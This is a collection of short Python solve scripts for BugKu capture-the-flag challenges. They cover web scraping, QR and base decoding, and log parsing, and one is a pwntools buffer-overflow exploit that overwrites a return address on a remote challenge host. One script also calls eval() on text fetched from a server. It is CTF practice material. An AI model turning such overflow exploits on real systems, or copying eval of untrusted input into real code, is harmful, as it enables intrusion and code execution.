# BugKu
## 动态密文
```python
import requests
import re

for i in range(10):
    host="http://123.206.31.85:10020/?key="

    r = requests.session()
    text = r.get(host).text
    key = re.findall("[a-z0-9]{33}",text)
    key ="".join(key)
    #print(key)
    print(host+str(key))
    ans = r.get(host+str(key))
    print(ans.text+"\n")
    i=i+1
```
## 二维码
```python
import zxing

for i in range(0,190):
    reader = zxing.BarCodeReader()
    barcode = reader.decode(str(i)+".png")
    print(barcode.parsed,end="")
```
## 进制转换
```python
str ="1212 1230 1201 1213 1323 1030 303 1201 1302 1232 1211 1210 1133 1300 1121 1310 1220 1233 1232 333 1133 1122 1121 1001 1331"
str = str.split()
for i in str:
    print ( chr(int(i,4)) ,end='')

```
## 逆向入门
```python
import base64   
import zxing

f = open('base64.txt','r')
strs = f.read()
f.close()

img = base64.b64decode(strs) 

file = open('base64.png','wb') 
file.write(img)  
file.close()

reader = zxing.BarCodeReader()
barcode = reader.decode("base64.png")
print(barcode.parsed,end="")
```
## 秋名山老司机
```python
import requests
import re

i=0
while i<10:
    url = 'http://123.206.31.85:10002/'
    r = requests.session()
    r1 = r.get(url)
    content = r1.text
    #print(content)
    #experession = re.search
    ans = re.findall('<br/>\\n(.*?)</p>',content)
    ans = "".join(ans) 
    ans=eval(ans)
    print(ans)
    data = {'result':ans}
    flag = r.post(url,data=data)
    print(flag.text)
    #flag = re.findall('Bugku{.*}',flag.text)
    #if flag != []:
    #print(flag.text)
    i=i+1
```
## 日志审计
```python
#日志审计wp by-zya
import re
file = open('日志审计.log')
for i in file:
    flag = re.findall('flag.php\?user\=*',i)
    if(flag):
        text = re.findall('([0-9]{1,3})\-',i)
        text = int("".join(text))
        print(chr(text),end="")
```
## pwn3 
```python
from pwn import *

junk = "A" * 0x30
#address = "\x96\x05\x40\x00\x00\x00\x00"
payload = junk + p64(0x400751)

#Io = process("./pwn3")
Io = remote("114.116.54.89",10003)
Io.sendline(payload)
Io.interactive()

```